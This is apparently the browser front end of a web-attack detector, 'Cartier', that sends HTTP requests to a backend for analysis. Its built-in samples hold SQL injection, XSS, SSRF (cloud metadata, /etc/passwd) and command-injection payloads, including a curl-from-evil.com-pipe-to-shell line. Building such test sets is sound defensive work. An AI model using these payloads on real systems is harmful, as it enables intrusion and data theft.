const methodField = document.getElementById("method");
const urlField = document.getElementById("url");
const headersField = document.getElementById("headers");
const bodyField = document.getElementById("body");
const backendField = document.getElementById("backend");
const checkButton = document.getElementById("check");
const statusEl = document.getElementById("status");
const previewEl = document.getElementById("preview");
const summaryEl = document.getElementById("summary");
const findingsEl = document.getElementById("findings");
const analyzeButton = document.getElementById("analyze");
const copyButton = document.getElementById("copy");
const clearButton = document.getElementById("clear");

let samplesCache = {
  clean: {
    method: "GET",
    url: "https://shop.example.com/products?id=24",
    headers: "User-Agent: CartierTest\nAccept: */*",
    body: "",
  },
  sqli_union: {
    method: "GET",
    url: "https://shop.example.com/products?id=1%20UNION%20SELECT%20username,password%20FROM%20users--",
    headers: "User-Agent: CartierTest\nAccept: */*",
    body: "",
  },
  sqli_boolean: {
    method: "GET",
    url: "https://shop.example.com/login?user=admin' OR 1=1--",
    headers: "User-Agent: CartierTest\nAccept: */*",
    body: "",
  },
  xss_script: {
    method: "GET",
    url: "https://shop.example.com/search?q=<script>alert(1)</script>",
    headers: "User-Agent: CartierTest\nAccept: */*",
    body: "",
  },
  xss_event: {
    method: "GET",
    url: "https://shop.example.com/profile?bio=<img src=x onerror=alert(1)>",
    headers: "User-Agent: CartierTest\nAccept: */*",
    body: "",
  },
  ssrf_meta: {
    method: "POST",
    url: "https://shop.example.com/fetch",
    headers: "Content-Type: application/json",
    body: '{"url":"http://169.254.169.254/latest/meta-data/iam"}',
  },
  ssrf_file: {
    method: "POST",
    url: "https://shop.example.com/fetch",
    headers: "Content-Type: application/json",
    body: '{"url":"file:///etc/passwd"}',
  },
  rce_chain: {
    method: "POST",
    url: "https://shop.example.com/convert",
    headers: "Content-Type: application/x-www-form-urlencoded",
    body: "file=report.pdf;curl http://evil.com/s.sh|sh",
  },
  rce_subst: {
    method: "POST",
    url: "https://shop.example.com/convert",
    headers: "Content-Type: application/x-www-form-urlencoded",
    body: "file=report.pdf&format=pdf$(id)",
  },
};

const defaultBackend =
  window.location.protocol === "file:"
    ? "http://localhost:8080"
    : window.location.origin;
backendField.value = defaultBackend;

async function loadSamples() {
  try {
    const response = await fetch(`${getBackend()}/api/samples`);
    if (!response.ok) {
      return;
    }
    const data = await response.json();
    samplesCache = data;
  } catch (error) {
    // keep fallback samples
  }
}

function getBackend() {
  const value = backendField.value.trim();
  return value ? value : defaultBackend;
}

function setStatus(state, message) {
  statusEl.classList.remove("good", "bad", "neutral");
  statusEl.classList.add(state);
  statusEl.textContent = message;
}

function setSummary(summary) {
  if (!summary) {
    summaryEl.innerHTML = "<h3>No analysis yet</h3><p>Send a request to see detection results.</p>";
    return;
  }
  if (!summary.attack_detected) {
    summaryEl.innerHTML = "<h3>No attacks detected</h3><p>Cartier found no obvious attack indicators.</p>";
    return;
  }
  summaryEl.innerHTML = `<h3>Potential attacks detected</h3><p>${summary.count} categories flagged. Top: ${summary.top_attack}.</p>`;
}

function renderFindings(findings) {
  findingsEl.innerHTML = "";
  if (!findings || findings.length === 0) {
    findingsEl.innerHTML = "<p class=\"muted\">No findings yet.</p>";
    return;
  }
  findings.forEach((finding) => {
    const wrapper = document.createElement("div");
    wrapper.className = "finding";
    wrapper.innerHTML = `
      <h4>${finding.attack} <small>(${finding.confidence} confidence, score ${finding.score})</small></h4>
      <div class="evidence"></div>
    `;
    const evidenceContainer = wrapper.querySelector(".evidence");
    finding.evidence.forEach((item) => {
      const ev = document.createElement("div");
      ev.innerHTML = `<strong>${item.rule}</strong> — ${item.reason}<br/><span>${item.match}</span>`;
      evidenceContainer.appendChild(ev);
    });
    findingsEl.appendChild(wrapper);
  });
}

function buildRequestPreview() {
  const payload = `${methodField.value} ${urlField.value.trim()}\n${headersField.value.trim()}\n\n${bodyField.value.trim()}`;
  previewEl.textContent = payload.trim() || "No payload yet.";
}

async function checkHealth() {
  setStatus("neutral", "Checking...");
  try {
    const response = await fetch(`${getBackend()}/health`);
    if (!response.ok) {
      throw new Error("bad status");
    }
    setStatus("good", "Backend OK");
  } catch (error) {
    setStatus("bad", "Backend unreachable");
  }
}

function buildCurl() {
  const method = methodField.value;
  const url = urlField.value.trim();
  const headers = headersField.value
    .split("\n")
    .map((line) => line.trim())
    .filter(Boolean)
    .map((line) => `-H "${line.replace(/\"/g, "\\\\\"")}"`)
    .join(" ");
  const body = bodyField.value.trim();
  const bodyPart = body ? `--data '${body.replace(/'/g, "'\\''")}'` : "";
  return `curl -X ${method} ${headers} ${bodyPart} \"${url}\"`.replace(/\s+/g, " ").trim();
}

async function copyCurl() {
  const curl = buildCurl();
  try {
    await navigator.clipboard.writeText(curl);
    setStatus("good", "cURL copied");
  } catch (error) {
    setStatus("neutral", "Copy failed");
  }
}

async function analyze() {
  const payload = {
    method: methodField.value,
    url: urlField.value.trim(),
    headers: headersField.value.trim(),
    body: bodyField.value.trim(),
  };

  summaryEl.innerHTML = "<h3>Analyzing...</h3><p>Cartier is inspecting the request.</p>";
  findingsEl.innerHTML = "";

  try {
    const response = await fetch(`${getBackend()}/api/analyze`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
    const data = await response.json();
    setSummary(data.summary);
    renderFindings(data.findings);
    setStatus("good", "Backend OK");
  } catch (error) {
    summaryEl.innerHTML = "<h3>Error</h3><p>Could not reach the backend.</p>";
    setStatus("bad", "Backend unreachable");
  }
}

function clearForm() {
  methodField.value = "GET";
  urlField.value = "";
  headersField.value = "";
  bodyField.value = "";
  setSummary(null);
  findingsEl.innerHTML = "";
  buildRequestPreview();
}

function loadSample(key) {
  const sample = samplesCache[key];
  if (!sample) {
    return;
  }
  methodField.value = sample.method;
  urlField.value = sample.url;
  headersField.value = sample.headers;
  bodyField.value = sample.body;
  buildRequestPreview();
  analyze();
}

analyzeButton.addEventListener("click", analyze);
clearButton.addEventListener("click", clearForm);
checkButton.addEventListener("click", checkHealth);
copyButton.addEventListener("click", copyCurl);

[methodField, urlField, headersField, bodyField].forEach((field) => {
  field.addEventListener("input", buildRequestPreview);
});

Array.from(document.querySelectorAll("[data-sample]")).forEach((button) => {
  button.addEventListener("click", () => loadSample(button.dataset.sample));
});

setSummary(null);
buildRequestPreview();
loadSamples();
